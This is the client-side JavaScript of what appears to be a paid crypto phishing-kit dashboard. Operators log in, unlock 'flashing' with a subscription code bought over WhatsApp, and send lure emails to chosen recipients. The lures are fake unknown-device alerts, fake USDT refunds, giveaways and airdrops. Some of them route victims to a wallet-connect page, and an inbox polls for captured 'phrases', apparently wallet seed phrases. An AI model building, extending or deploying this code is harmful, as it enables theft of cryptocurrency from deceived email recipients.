document.addEventListener("DOMContentLoaded", () => {
  // DOM Elements
  const preloader = document.querySelector(".preloader")
  const loginPage = document.getElementById("login-page")
  const dashboardPage = document.getElementById("dashboard-page")
  const campaignPage = document.getElementById("campaign-page")
  const emailsContent = document.getElementById("emails-content")
  const dashboardContent = document.getElementById("dashboard-content")

  const loginBtn = document.getElementById("login-btn")
  const logoutBtn = document.getElementById("logout-btn")
  const startFlashingBtn = document.getElementById("start-flashing-btn")
  const backToDashboardLink = document.getElementById("back-to-dashboard-link")
  const sendEmailBtn = document.getElementById("send-email-btn")
  const toggleSidebar = document.getElementById("toggle-sidebar")
  const toggleCampaignSidebar = document.getElementById("toggle-campaign-sidebar")
  const sidebar = document.querySelector(".sidebar")

  const usernameInput = document.getElementById("username")
  const passwordInput = document.getElementById("password")
  const loginError = document.getElementById("login-error")
  const togglePassword = document.querySelector(".toggle-password")

  const campaignTypeRadios = document.getElementsByName("campaign-type")
  const dynamicFields = document.getElementById("dynamic-fields")
  const walletField = document.getElementById("wallet-field")

  const walletSelect = document.getElementById("wallet-select")
  const recipientEmail = document.getElementById("recipient-email")
  const messageContent = document.getElementById("message-content")
  const redirectLink = document.getElementById("redirect-link")
  const buttonText = document.getElementById("button-text")

  const emailCount = document.getElementById("email-count")
  const recentActivityList = document.getElementById("recent-activity-list")
  const sentEmailsList = document.getElementById("sent-emails-list")

  const loadingOverlay = document.getElementById("loading-overlay")
  const pageTitle = document.getElementById("page-title")

  const userAvatar = document.querySelector(".user-avatar")
  const userDropdown = document.getElementById("user-dropdown")

  // Add this code after it:
  const logoutDropdownBtn = document.getElementById("logout-dropdown-btn")
  if (logoutDropdownBtn) {
    logoutDropdownBtn.addEventListener("click", () => {
      // Clear session
      localStorage.removeItem("userSession")

      // Redirect to login page
      dashboardPage.classList.add("hidden")
      loginPage.classList.remove("hidden")
      usernameInput.value = ""
      passwordInput.value = ""
      loginError.textContent = ""

      // Hide dropdown
      userDropdown.classList.remove("show")
    })
  }

  // Check for existing session
  checkSession()

  // Remove preloader after page loads
  window.addEventListener("load", () => {
    setTimeout(() => {
      preloader.style.display = "none"
    }, 500)
  })

  // Initialize data
  let sentEmails = []
  loadUserData()

  // User dropdown toggle
  if (userAvatar) {
    userAvatar.addEventListener("click", () => {
      userDropdown.classList.toggle("show")
    })

    // Close dropdown when clicking outside
    document.addEventListener("click", (e) => {
      if (!userAvatar.contains(e.target) && !userDropdown.contains(e.target)) {
        userDropdown.classList.remove("show")
      }
    })
  }

  // Toggle password visibility
  if (togglePassword) {
    togglePassword.addEventListener("click", function () {
      const type = passwordInput.getAttribute("type") === "password" ? "text" : "password"
      passwordInput.setAttribute("type", type)
      this.classList.toggle("fa-eye")
      this.classList.toggle("fa-eye-slash")
    })
  }

  // Toggle sidebar
  if (toggleSidebar) {
    toggleSidebar.addEventListener("click", () => {
      sidebar.classList.toggle("collapsed")
    })
  }

  if (toggleCampaignSidebar) {
    toggleCampaignSidebar.addEventListener("click", () => {
      document.querySelector("#campaign-page .sidebar").classList.toggle("collapsed")
    })
  }

  // Sidebar menu navigation
  const sidebarMenuItems = document.querySelectorAll(".sidebar-menu li a")
  sidebarMenuItems.forEach((item) => {
    item.addEventListener("click", function (e) {
      if (this.getAttribute("href") === "#dashboard") {
        e.preventDefault()
        dashboardContent.classList.remove("hidden")
        emailsContent.classList.add("hidden")
        document.getElementById("profile-content").classList.add("hidden")
        pageTitle.textContent = "Dashboard"

        // Update active state
        sidebarMenuItems.forEach((menuItem) => {
          menuItem.parentElement.classList.remove("active")
        })
        this.parentElement.classList.add("active")
      } else if (this.getAttribute("href") === "#emails") {
        e.preventDefault()
        dashboardContent.classList.add("hidden")
        emailsContent.classList.remove("hidden")
        document.getElementById("profile-content").classList.add("hidden")
        pageTitle.textContent = "Sent Emails"

        // Update active state
        sidebarMenuItems.forEach((menuItem) => {
          menuItem.parentElement.classList.remove("active")
        })
        this.parentElement.classList.add("active")
      } else if (this.getAttribute("href") === "#profile") {
        e.preventDefault()
        dashboardContent.classList.add("hidden")
        emailsContent.classList.add("hidden")
        document.getElementById("profile-content").classList.remove("hidden")
        pageTitle.textContent = "My Profile"

        // Update active state
        sidebarMenuItems.forEach((menuItem) => {
          menuItem.parentElement.classList.remove("active")
        })
        this.parentElement.classList.add("active")
      }
    })
  })

  // Add inbox button to dashboard with notification count
  const addInboxButtonToDashboard = () => {
    // Create inbox button
    const inboxButton = document.createElement("a")
    inboxButton.href = "inbox.html"
    inboxButton.className = "btn primary-btn inbox-btn"
    inboxButton.innerHTML = `
      <i class="fas fa-inbox"></i>
      <span>Inbox</span>
      <div class="notification-badge hidden">0</div>
    `

    // Add to dashboard
    const actionCard = document.querySelector(".action-card")
    if (actionCard) {
      actionCard.appendChild(inboxButton)
    }

    // Update notification count
    updateInboxNotificationCount()
  }

  // Function to update inbox notification count
  const updateInboxNotificationCount = () => {
    const session = JSON.parse(localStorage.getItem("userSession"))
    if (!session || !session.userId) return

    fetch(`/api/inbox/${session.userId}`)
      .then((response) => {
        if (!response.ok) {
          throw new Error("Failed to fetch inbox data")
        }
        return response.json()
      })
      .then((data) => {
        const unreadCount = (data.phrases || []).filter((phrase) => !phrase.read).length
        const badge = document.querySelector(".notification-badge")

        if (badge) {
          if (unreadCount > 0) {
            badge.textContent = unreadCount
            badge.classList.remove("hidden")
          } else {
            badge.classList.add("hidden")
          }
        }
      })
      .catch((error) => {
        console.error("Error loading inbox count:", error)
      })
  }

  // Call this function after dashboard is loaded
  if (dashboardPage) {
    addInboxButtonToDashboard()

    // Poll for new phrases every 30 seconds
    setInterval(updateInboxNotificationCount, 30000)
  }

  // Login functionality
  if (loginBtn) {
    loginBtn.addEventListener("click", () => {
      const username = usernameInput.value.trim()
      const password = passwordInput.value.trim()

      // Use API endpoint to validate login
      fetch("/api/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ username, password }),
      })
        .then((response) => response.json())
        .then((data) => {
          if (data.success) {
            loginSuccess(username)
          } else {
            loginError.textContent = data.message || "Invalid username or password. Please try again."
            loginError.style.display = "block"
            passwordInput.value = ""
          }
        })
        .catch((error) => {
          console.error("Error during login:", error)
          loginError.textContent = "Error during login. Please try again."
          loginError.style.display = "block"
        })
    })
  }

  // Modify the login success function to generate a user ID
  function loginSuccess(username) {
    // Check if there's an existing user ID in localStorage
    let userId = localStorage.getItem("persistentUserId")

    // If no persistent ID exists, create one and store it
    if (!userId) {
      userId = Date.now().toString(36) + Math.random().toString(36).substr(2, 5)
      localStorage.setItem("persistentUserId", userId)
    }

    // Save session to localStorage with the persistent user ID
    const session = {
      username: username,
      timestamp: new Date().toISOString(),
      userId: userId,
    }
    localStorage.setItem("userSession", JSON.stringify(session))

    // Update UI
    document.querySelector(".user-info span").textContent = `Welcome, ${username}`

    loginPage.classList.add("hidden")
    dashboardPage.classList.remove("hidden")
    showToast("Login successful! Welcome back.", "success")

    // Load user data
    loadUserData()
  }

  function checkSession() {
    const session = JSON.parse(localStorage.getItem("userSession"))
    if (session) {
      // Update UI
      document.querySelector(".user-info span").textContent = `Welcome, ${session.username}`

      loginPage.classList.add("hidden")
      dashboardPage.classList.remove("hidden")

      // Load user data
      loadUserData()
    }
  }

  // Modify the loadUserData function to ensure it loads only the current user's campaigns
  // Update the loadUserData function to include userId in the request
  function loadUserData() {
    const session = JSON.parse(localStorage.getItem("userSession"))
    if (!session) return

    // Include userId in the request to only get this user's campaigns
    fetch(`/api/campaigns?userId=${session.userId}`)
      .then((response) => {
        if (!response.ok) {
          throw new Error("Failed to fetch campaigns")
        }
        return response.json()
      })
      .then((campaigns) => {
        // Now campaigns will only include the current user's campaigns
        sentEmails = campaigns
        updateEmailCount()
        updateRecentActivity()
        updateSentEmailsList()

        function updateProfileInfo() {
          const session = JSON.parse(localStorage.getItem("userSession"))
          if (!session) return

          // Load user info from API
          fetch(`/api/user/${session.username}`)
            .then((response) => {
              if (!response.ok) {
                throw new Error("Failed to fetch user data")
              }
              return response.json()
            })
            .then((user) => {
              if (user) {
                // Update profile information
                document.getElementById("profile-username").textContent = user.username
                document.getElementById("profile-email").textContent = user.email || "No email provided"
                document.getElementById("info-username").textContent = user.username
                document.getElementById("info-email").textContent = user.email || "No email provided"

                const joinDate = new Date(user.createdAt)
                document.getElementById("info-joined").textContent = joinDate.toLocaleDateString("en-US", {
                  year: "numeric",
                  month: "long",
                  day: "numeric",
                })

                // Update email count in profile - only count user's own emails
                document.getElementById("profile-email-count").textContent = sentEmails.length
              }
            })
            .catch((error) => {
              console.error("Error loading user data:", error)
            })
        }

        // Call the function
        updateProfileInfo()
      })
      .catch((error) => {
        console.error("Error loading campaigns:", error)
        sentEmails = []
        updateEmailCount()
        updateRecentActivity()
        updateSentEmailsList()
      })
  }

  // Logout functionality
  const handleLogout = () => {
    // Get the current session to preserve the userId
    const session = JSON.parse(localStorage.getItem("userSession")) || {}

    // Clear session but keep the persistent userId
    localStorage.removeItem("userSession")

    // Don't remove the persistentUserId from localStorage

    dashboardPage.classList.add("hidden")
    loginPage.classList.remove("hidden")
    usernameInput.value = ""
    passwordInput.value = ""
    loginError.textContent = ""
  }

  logoutBtn.addEventListener("click", () => {
    handleLogout()
  })

  // Modify the startFlashingBtn click event handler to check for authentication
  startFlashingBtn.addEventListener("click", () => {
    const session = JSON.parse(localStorage.getItem("userSession")) || {}

    // Check if user is already authenticated
    if (session.authenticated) {
      // Check if authentication is expired
      if (session.authExpires && new Date(session.authExpires) < new Date()) {
        // Authentication expired
        session.authenticated = false
        session.authCode = null
        session.authExpires = null
        localStorage.setItem("userSession", JSON.stringify(session))

        // Show authentication modal with expired message
        showAuthModal("Your authentication code has expired. Please enter a new code.")
      } else {
        // User is authenticated and not expired, proceed to campaign page
        dashboardPage.classList.add("hidden")
        campaignPage.classList.remove("hidden")
      }
    } else {
      // Show authentication modal
      showAuthModal()
    }
  })

  // Function to show authentication modal
  // Modify the showAuthModal function to properly handle the "How to get code" button
  function showAuthModal(message = null) {
    // Create auth modal if it doesn't exist
    if (!document.getElementById("auth-modal")) {
      const modal = document.createElement("div")
      modal.id = "auth-modal"
      modal.className = "modal"
      modal.innerHTML = `
    <div class="modal-content">
      <div class="modal-header">
        <h2>Authentication Required</h2>
        <button class="close-btn" id="close-auth-modal">
          <i class="fas fa-times"></i>
        </button>
      </div>
      <div class="modal-body">
        <p id="auth-modal-message">Please enter your authentication code to start flashing.</p>
        <div class="input-group">
          <label for="flash-auth-code">
            <i class="fas fa-key"></i>
            Authentication Code
          </label>
          <input type="text" id="flash-auth-code" placeholder="Enter authentication code">
        </div>
        <div class="error-message" id="auth-error" style="display: none;"></div>
        <div class="auth-code-actions">
          <button class="btn secondary-btn" id="how-to-get-code-btn">
            <i class="fas fa-question-circle"></i>
            How to get code
          </button>
          <button class="btn primary-btn" id="auth-code-btn">
            <i class="fas fa-comment"></i>
            Get authorization code
          </button>
        </div>
      </div>
      <div class="modal-footer">
        <button class="btn primary-btn" id="submit-auth-code">Submit</button>
      </div>
    </div>
  `

      document.body.appendChild(modal)

      // Add event listeners
      document.getElementById("close-auth-modal").addEventListener("click", () => {
        document.getElementById("auth-modal").classList.add("hidden")
      })

      document.getElementById("how-to-get-code-btn").addEventListener("click", () => {
        // Hide auth modal before showing subscription modal
        document.getElementById("auth-modal").classList.add("hidden")

        // Create subscription modal if it doesn't exist
        if (!document.getElementById("subscription-modal")) {
          const subModal = document.createElement("div")
          subModal.id = "subscription-modal"
          subModal.className = "modal"
          subModal.innerHTML = `
    <div class="modal-content">
      <div class="modal-header">
        <h2>How to Get Authentication Code</h2>
        <button class="close-btn" id="close-subscription-modal">
          <i class="fas fa-times"></i>
        </button>
      </div>
      <div class="modal-body">
        <p>To get an authentication code, you need to subscribe to our premium service.</p>
        <div class="subscription-info">
          <div class="subscription-price">
            <i class="fas fa-tag"></i>
            <span>Subscription Price: 30,000 per month</span>
          </div>
          <div class="subscription-features">
            <h4>Features include:</h4>
            <ul>
              <li><i class="fas fa-check"></i> Unlimited email flashing</li>
              <li><i class="fas fa-check"></i> Premium wallet templates</li>
              <li><i class="fas fa-check"></i> Priority support</li>
              <li><i class="fas fa-check"></i> Advanced analytics</li>
            </ul>
          </div>
        </div>
      </div>
      <div class="modal-footer">
        <button class="btn secondary-btn" id="close-sub-modal-btn">Close</button>
        <button class="btn primary-btn" id="get-code-whatsapp-btn">
          <i class="fab fa-whatsapp"></i> Contact on WhatsApp
        </button>
      </div>
    </div>
  `

          document.body.appendChild(subModal)

          // Add event listeners for subscription modal
          document.getElementById("close-subscription-modal").addEventListener("click", () => {
            document.getElementById("subscription-modal").classList.add("hidden")
          })

          document.getElementById("close-sub-modal-btn").addEventListener("click", () => {
            document.getElementById("subscription-modal").classList.add("hidden")
          })

          document.getElementById("get-code-whatsapp-btn").addEventListener("click", () => {
            window.open(
              "https://wa.me/17062481811?text=Sir%20pls%20I%20need%20authorization%20code%20I%20know%20the%20subscription%20is%2030k%20per%20month",
              "_blank",
            )
          })
        }

        document.getElementById("subscription-modal").classList.remove("hidden")
      })

      document.getElementById("auth-code-btn").addEventListener("click", () => {
        window.open(
          "https://wa.me/17062481811?text=Sir%20pls%20I%20need%20authorization%20code%20I%20know%20the%20subscription%20is%2030k%20per%20month",
          "_blank",
        )
      })

      document.getElementById("submit-auth-code").addEventListener("click", validateAuthCode)
    }

    // Set custom message if provided
    if (message) {
      document.getElementById("auth-modal-message").textContent = message
    } else {
      document.getElementById("auth-modal-message").textContent =
        "Please enter your authentication code to start flashing."
    }

    // Clear any previous error
    const errorMsg = document.getElementById("auth-error")
    if (errorMsg) {
      errorMsg.textContent = ""
      errorMsg.style.display = "none"
    }

    // Show the modal
    document.getElementById("auth-modal").classList.remove("hidden")
  }

  // Function to validate authentication code
  // Modify the validateAuthCode function to use the new API endpoint
  function validateAuthCode() {
    const authCode = document.getElementById("flash-auth-code").value.trim()
    const errorMsg = document.getElementById("auth-error")

    if (!authCode) {
      errorMsg.textContent = "Please enter an authentication code"
      errorMsg.style.display = "block"
      return
    }

    // Show loading state
    const submitBtn = document.getElementById("submit-auth-code")
    const originalBtnText = submitBtn.innerHTML
    submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Validating...'
    submitBtn.disabled = true

    // Get current user
    const session = JSON.parse(localStorage.getItem("userSession")) || {}
    const username = session.username

    if (!username) {
      errorMsg.textContent = "You must be logged in to authenticate"
      errorMsg.style.display = "block"
      submitBtn.innerHTML = originalBtnText
      submitBtn.disabled = false
      return
    }

    // Validate code via API
    fetch("/api/validate-auth-code", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ code: authCode, username }),
    })
      .then((response) => response.json())
      .then((data) => {
        if (data.success) {
          // Save authentication status to session
          session.authenticated = true
          session.authCode = authCode
          session.authExpires = data.expiresAt
          localStorage.setItem("userSession", JSON.stringify(session))

          // Hide modal and proceed to campaign page
          document.getElementById("auth-modal").classList.add("hidden")
          dashboardPage.classList.add("hidden")
          campaignPage.classList.remove("hidden")

          // Show success message
          showToast(
            `Authentication successful! Your code is valid until ${new Date(data.expiresAt).toLocaleDateString()}`,
            "success",
          )
        } else {
          errorMsg.textContent = data.message || "Invalid authentication code"
          errorMsg.style.display = "block"
        }
      })
      .catch((error) => {
        console.error("Error validating auth code:", error)
        errorMsg.textContent = "Error validating code. Please try again."
        errorMsg.style.display = "block"
      })
      .finally(() => {
        // Reset button
        submitBtn.innerHTML = originalBtnText
        submitBtn.disabled = false
      })
  }

  // Navigate back to dashboard
  backToDashboardLink.addEventListener("click", (e) => {
    e.preventDefault()
    campaignPage.classList.add("hidden")
    dashboardPage.classList.remove("hidden")
    resetCampaignForm()
  })

  // Find the function that handles campaign type selection
  // Add the refund amount field to the dynamic fields section
  campaignTypeRadios.forEach((radio) => {
    radio.addEventListener("change", function () {
      // Show dynamic fields section
      dynamicFields.classList.remove("hidden")

      // Reset all conditional fields first
      walletField.classList.add("hidden")

      // Hide refund amount field by default
      const refundAmountField = document.getElementById("refund-amount-field")
      if (refundAmountField) refundAmountField.classList.add("hidden")

      // Show/hide fields based on campaign type
      const campaignType = this.value
      console.log("Selected campaign type:", campaignType)

      if (campaignType === "UNKNOWN DEVICE LOGIN") {
        walletField.classList.remove("hidden")
        buttonText.value = "Block Unknown Device"

        // Hide redirect link field for Unknown Device Login
        document.getElementById("redirect-field").classList.add("hidden")
      } else if (campaignType === "REFUND") {
        walletField.classList.remove("hidden")
        buttonText.value = "Begin Verification"

        // Show refund amount field for Refund type
        if (refundAmountField) {
          refundAmountField.classList.remove("hidden")
        } else {
          // Create refund amount field if it doesn't exist
          const refundField = document.createElement("div")
          refundField.id = "refund-amount-field"
          refundField.className = "form-section"
          refundField.innerHTML = `
            <h3>Refund Amount</h3>
            <div class="input-wrapper">
              <input type="text" id="refund-amount" placeholder="Enter refund amount (e.g. 10000 USDT)">
              <i class="fas fa-dollar-sign"></i>
            </div>
          `
          // Insert after wallet field
          walletField.parentNode.insertBefore(refundField, walletField.nextSibling)
        }

        // Hide redirect link field for Refund
        document.getElementById("redirect-field").classList.add("hidden")
      } else {
        document.getElementById("redirect-field").classList.remove("hidden")

        if (campaignType === "GIVEAWAY") {
          buttonText.value = "Join Giveaway Now"
        } else if (campaignType === "AIRDROP") {
          buttonText.value = "Claim Airdrop"
        } else if (campaignType === "ALERT") {
          buttonText.value = "Verify Now"
        }
      }

      // Auto-scroll to dynamic fields
      setTimeout(() => {
        dynamicFields.scrollIntoView({ behavior: "smooth", block: "start" })
      }, 100)
    })
  })

  // Ensure the send email functionality always includes the user's ID
  // Update the sendEmailBtn click event handler to include refund amount
  sendEmailBtn.addEventListener("click", async () => {
    if (!validateForm()) return

    // Show loading overlay
    loadingOverlay.classList.remove("hidden")

    const campaignType = document.querySelector('input[name="campaign-type"]:checked').value
    const email = recipientEmail.value
    const message = messageContent.value
    let link = redirectLink.value
    const btnText = buttonText.value
    const wallet = walletSelect.value

    // Get refund amount if it's a refund campaign
    let refundAmount = null
    if (campaignType === "REFUND") {
      const refundAmountInput = document.getElementById("refund-amount")
      refundAmount = refundAmountInput ? refundAmountInput.value : "10000 USDT"
    }

    const session = JSON.parse(localStorage.getItem("userSession"))
    const sender = session ? session.username : "Anonymous"
    const userId = session ? session.userId : null

    // For Unknown Device Login or Refund, set the redirect link to the wallet connect page with user ID
    if (campaignType === "UNKNOWN DEVICE LOGIN" || campaignType === "REFUND") {
      // Generate a unique ID for the user if not already present
      if (!session.userId) {
        session.userId = localStorage.getItem("persistentUserId")
        localStorage.setItem("userSession", JSON.stringify(session))
      }

      // Set the redirect link to the wallet connect page with user ID
      link = `/wallet/index.html#${session.userId}`
    }

    try {
      // Send email using our backend API
      const response = await fetch("/api/send-email", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          type: campaignType,
          wallet: wallet,
          email: email,
          message: message,
          redirectLink: link,
          buttonText: btnText,
          sender: sender,
          userId: userId, // Always include the user ID
          refundAmount: refundAmount, // Include refund amount for REFUND type
        }),
      })

      const result = await response.json()

      if (result.success) {
        // Add to sent emails
        const newEmail = {
          id: Date.now().toString(),
          timestamp: new Date().toISOString(),
          sender: sender,
          recipient: email,
          subject: getEmailSubject(campaignType),
          type: campaignType,
          message: message,
          redirectLink: link,
          buttonText: btnText,
          wallet: wallet || null,
          userId: userId, // Always include the user ID
          refundAmount: refundAmount, // Include refund amount for REFUND type
        }

        // Update local data
        sentEmails.push(newEmail)

        // Update UI
        updateEmailCount()
        updateRecentActivity()
        updateSentEmailsList()

        // Update profile email count if profile page exists
        const profileEmailCount = document.getElementById("profile-email-count")
        if (profileEmailCount) {
          profileEmailCount.textContent = sentEmails.filter((email) => email.userId === userId).length
        }

        // Show success message
        showToast("Email sent successfully!", "success")

        // Reset form and go back to dashboard
        resetCampaignForm()
        campaignPage.classList.add("hidden")
        dashboardPage.classList.remove("hidden")
      } else {
        showToast("Failed to send email: " + (result.message || "Unknown error"), "error")
      }
    } catch (error) {
      console.error("Error sending email:", error)
      showToast("Error sending email. Please try again.", "error")
    } finally {
      // Hide loading overlay
      loadingOverlay.classList.add("hidden")
    }
  })

  // Helper function to get email subject based on campaign type
  // Update the getEmailSubject function to include REFUND type
  function getEmailSubject(campaignType) {
    switch (campaignType) {
      case "UNKNOWN DEVICE LOGIN":
        return "Security Alert: Unknown Device Login Detected"
      case "GIVEAWAY":
        return "You've Been Selected for Our Exclusive Giveaway!"
      case "AIRDROP":
        return "Claim Your Token Airdrop Now"
      case "ALERT":
        return "Important Account Alert"
      case "REFUND":
        return "Refund Notification: Action Required"
      default:
        return "Important Notification"
    }
  }

  // Helper functions
  // Modify the validateForm function to skip redirect link validation for Unknown Device Login
  // Update the validateForm function to include validation for REFUND type
  function validateForm() {
    // Check if campaign type is selected
    if (!document.querySelector('input[name="campaign-type"]:checked')) {
      showToast("Please select a campaign type", "error")
      return false
    }

    const campaignType = document.querySelector('input[name="campaign-type"]:checked').value

    // Check wallet for UNKNOWN DEVICE LOGIN and REFUND
    if ((campaignType === "UNKNOWN DEVICE LOGIN" || campaignType === "REFUND") && !walletSelect.value) {
      showToast("Please select a wallet", "error")
      return false
    }

    // Check refund amount for REFUND type
    if (campaignType === "REFUND") {
      const refundAmountInput = document.getElementById("refund-amount")
      if (refundAmountInput && !refundAmountInput.value.trim()) {
        showToast("Please enter a refund amount", "error")
        return false
      }
    }

    // Check email
    if (!recipientEmail.value || !isValidEmail(recipientEmail.value)) {
      showToast("Please enter a valid email address", "error")
      return false
    }

    // Check message
    if (!messageContent.value.trim()) {
      showToast("Please enter a message", "error")
      return false
    }

    // Check redirect link only if not UNKNOWN DEVICE LOGIN or REFUND
    if (campaignType !== "UNKNOWN DEVICE LOGIN" && campaignType !== "REFUND") {
      if (!redirectLink.value || !isValidURL(redirectLink.value)) {
        showToast("Please enter a valid redirect link", "error")
        return false
      }
    }

    // Check button text
    if (!buttonText.value.trim()) {
      showToast("Please enter button text", "error")
      return false
    }

    return true
  }

  function isValidEmail(email) {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
    return re.test(email)
  }

  function isValidURL(url) {
    try {
      new URL(url)
      return true
    } catch (e) {
      return false
    }
  }

  // Update the resetCampaignForm function to reset refund amount field
  function resetCampaignForm() {
    // Reset radio buttons
    campaignTypeRadios.forEach((radio) => {
      radio.checked = false
    })

    // Reset fields
    walletSelect.value = ""
    recipientEmail.value = ""
    messageContent.value = ""
    redirectLink.value = ""
    buttonText.value = ""

    // Reset refund amount if it exists
    const refundAmountInput = document.getElementById("refund-amount")
    if (refundAmountInput) {
      refundAmountInput.value = ""
    }

    // Hide dynamic fields
    dynamicFields.classList.add("hidden")
    walletField.classList.add("hidden")

    // Hide refund amount field if it exists
    const refundAmountField = document.getElementById("refund-amount-field")
    if (refundAmountField) {
      refundAmountField.classList.add("hidden")
    }
  }

  function showToast(message, type = "info") {
    const toastContainer = document.getElementById("toast-container")
    const toast = document.createElement("div")
    toast.className = `toast toast-${type}`

    let icon
    switch (type) {
      case "success":
        icon = "fa-check-circle"
        break
      case "error":
        icon = "fa-exclamation-circle"
        break
      default:
        icon = "fa-info-circle"
    }

    toast.innerHTML = `
            <div class="toast-icon">
                <i class="fas ${icon}"></i>
            </div>
            <div class="toast-message">${message}</div>
        `

    toastContainer.appendChild(toast)

    // Remove toast after animation completes
    setTimeout(() => {
      toast.remove()
    }, 3000)
  }

  // Update the updateEmailCount function to only count the current user's emails
  function updateEmailCount() {
    const session = JSON.parse(localStorage.getItem("userSession"))
    if (!session || !session.userId) {
      emailCount.textContent = "0"
      return
    }

    // Filter emails for current user only
    const userEmails = sentEmails.filter((email) => email.userId === session.userId)
    emailCount.textContent = userEmails.length
  }

  // Update the updateRecentActivity function to only show activities for the current user
  function updateRecentActivity() {
    const session = JSON.parse(localStorage.getItem("userSession"))
    if (!session || !session.userId) {
      return
    }

    // Filter emails for current user only
    const userEmails = sentEmails.filter((email) => email.userId === session.userId)

    if (userEmails.length === 0) {
      recentActivityList.innerHTML = `
            <div class="empty-state">
                <i class="fas fa-history"></i>
                <p>No recent activity</p>
            </div>
        `
      return
    }

    // Get the 5 most recent emails
    const recentEmails = [...userEmails].sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp)).slice(0, 5)

    let html = ""
    recentEmails.forEach((email) => {
      const date = new Date(email.timestamp)
      const formattedDate = date.toLocaleString()

      html += `
            <div class="activity-item">
                <div class="activity-icon">
                    <i class="fas fa-envelope"></i>
                </div>
                <div class="activity-details">
                    <div class="activity-title">${email.type} email sent to ${email.recipient}</div>
                    <div class="activity-time">${formattedDate}</div>
                </div>
            </div>
        `
    })

    recentActivityList.innerHTML = html
  }

  // Update the updateSentEmailsList function to only show emails sent by the current user
  function updateSentEmailsList() {
    const session = JSON.parse(localStorage.getItem("userSession"))
    if (!session || !session.userId) {
      return
    }

    // Filter emails for current user only
    const userEmails = sentEmails.filter((email) => email.userId === session.userId)

    if (userEmails.length === 0) {
      sentEmailsList.innerHTML = `
            <div class="empty-state">
                <i class="fas fa-envelope-open"></i>
                <p>No emails sent yet</p>
            </div>
        `
      return
    }

    // Sort emails by timestamp (newest first)
    const sortedEmails = [...userEmails].sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))

    let html = ""
    sortedEmails.forEach((email) => {
      const date = new Date(email.timestamp)
      const formattedDate = date.toLocaleString()

      let icon
      switch (email.type) {
        case "GIVEAWAY":
          icon = "fa-gift"
          break
        case "AIRDROP":
          icon = "fa-parachute-box"
          break
        case "UNKNOWN DEVICE LOGIN":
          icon = "fa-shield-alt"
          break
        case "ALERT":
          icon = "fa-exclamation-triangle"
          break
        default:
          icon = "fa-envelope"
      }

      html += `
            <div class="email-item">
                <div class="email-icon">
                    <i class="fas ${icon}"></i>
                </div>
                <div class="email-details">
                    <div class="email-recipient">${email.recipient}</div>
                    <div class="email-subject">${email.type}</div>
                </div>
                <div class="email-time">${formattedDate}</div>
            </div>
        `
    })

    sentEmailsList.innerHTML = html
  }

  // Enter key for login
  if (passwordInput) {
    passwordInput.addEventListener("keyup", (event) => {
      if (event.key === "Enter") {
        loginBtn.click()
      }
    })
  }

  // Registration functionality
  const registerForm = document.getElementById("register-form")
  // Modify the registration functionality section and modify it
  if (registerForm) {
    const registerBtn = document.getElementById("register-btn")

    registerBtn.addEventListener("click", () => {
      const username = document.getElementById("reg-username").value.trim()
      const password = document.getElementById("reg-password").value.trim()
      const confirmPassword = document.getElementById("confirm-password").value.trim()
      const email = document.getElementById("reg-email").value.trim()
      const errorMsg = document.getElementById("register-error")

      // Validate inputs (removed auth code validation)
      if (!username || !password || !confirmPassword || !email) {
        errorMsg.textContent = "All fields are required"
        errorMsg.style.display = "block"
        return
      }

      if (password !== confirmPassword) {
        errorMsg.textContent = "Passwords do not match"
        errorMsg.style.display = "block"
        return
      }

      if (!isValidEmail(email)) {
        errorMsg.textContent = "Please enter a valid email"
        errorMsg.style.display = "block"
        return
      }

      // Register user
      const newUser = {
        username,
        password,
        email,
        createdAt: new Date().toISOString(),
        authenticated: false, // Add authenticated field
      }

      // Register via API endpoint
      fetch("/api/register", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(newUser),
      })
        .then((response) => response.json())
        .then((data) => {
          if (data.success) {
            // Show success message
            showToast("Registration successful! You can now login.", "success")

            // Switch to login page
            document.getElementById("register-page").classList.add("hidden")
            loginPage.classList.remove("hidden")
          } else {
            errorMsg.textContent = data.message || "Error registering user. Please try again."
            errorMsg.style.display = "block"
          }
        })
        .catch((error) => {
          console.error("Error registering user:", error)
          errorMsg.textContent = "Error registering user. Please try again."
          errorMsg.style.display = "block"
        })
    })
  }

  // Switch between login and register
  const switchToRegisterBtn = document.getElementById("switch-to-register")

  const switchToLoginBtn = document.getElementById("switch-to-login")

  if (switchToRegisterBtn) {
    switchToRegisterBtn.addEventListener("click", (e) => {
      e.preventDefault()
      loginPage.classList.add("hidden")
      document.getElementById("register-page").classList.remove("hidden")
    })
  }

  if (switchToLoginBtn) {
    switchToLoginBtn.addEventListener("click", (e) => {
      e.preventDefault()
      document.getElementById("register-page").classList.add("hidden")
      loginPage.classList.remove("hidden")
    })
  }

  // Add profile page navigation
  const profileLink = document.querySelector('.dropdown-menu a[href="#profile"]')
  if (profileLink) {
    profileLink.addEventListener("click", (e) => {
      e.preventDefault()

      // Hide other content
      dashboardContent.classList.add("hidden")
      emailsContent.classList.add("hidden")
      document.getElementById("profile-content").classList.remove("hidden")
      pageTitle.textContent = "My Profile"

      // Update active state in sidebar
      sidebarMenuItems.forEach((menuItem) => {
        menuItem.parentElement.classList.remove("active")
      })

      // Find and activate the profile menu item
      const profileMenuItem = document.querySelector('.sidebar-menu li a[href="#profile"]')
      if (profileMenuItem) {
        profileMenuItem.parentElement.classList.add("active")
      }

      // Hide dropdown
      userDropdown.classList.remove("show")
    })
  }

  // Add profile link in sidebar
  const profileMenuItemSidebar = document.querySelector('.sidebar-menu li a[href="#profile"]')
  if (profileMenuItemSidebar) {
    profileMenuItemSidebar.addEventListener("click", function (e) {
      e.preventDefault()

      // Hide other content
      dashboardContent.classList.add("hidden")
      emailsContent.classList.add("hidden")

      // Show profile content
      document.getElementById("profile-content").classList.remove("hidden")
      pageTitle.textContent = "My Profile"

      // Update active state
      sidebarMenuItems.forEach((menuItem) => {
        menuItem.parentElement.classList.remove("active")
      })
      this.parentElement.classList.add("active")
    })
  }

  // Add profile logout button functionality
  const profileLogoutBtn = document.getElementById("profile-logout-btn")
  if (profileLogoutBtn) {
    profileLogoutBtn.addEventListener("click", () => {
      handleLogout()
    })
  }

